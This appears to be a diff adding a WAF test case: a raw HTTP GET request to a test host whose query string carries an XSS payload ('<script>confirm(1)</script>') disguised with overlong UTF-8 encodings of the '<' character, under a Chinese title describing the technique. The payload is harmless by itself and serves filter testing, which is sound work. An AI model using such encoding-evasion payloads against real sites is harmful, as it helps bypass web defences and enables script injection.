@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_标签属性_编码类(超长UTF-8编码)-06506708
+# 利用过长的 UTF-8弹框
+GET /?id=%25C0%25BCscript%3Econfirm%281%29%3C%2Fscript%3E%20%25E0%2580%25BCscript%3Econfirm%281%29%3C%2Fscript%3E%20%25F0%2580%2580%25BCscript%3Econfirm%281%29%3C%2Fscript%3E%20%25F8%2580%2580%2580%25BCscript%3Econfirm%281%29%3C%2Fscript%3E%20%25FC%2580%2580%2580%2580%25BCscript%3Econfirm%281%29%3C%2Fscript%3E&bid=hd_tag_m8mv25i7 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25i7
+RM-PRO-Token: 3a1a370305f1f3118b027d4601a61f97
+RM-PRO-Time: 1742808470291
+User-Agent: curl/7.83.1
+
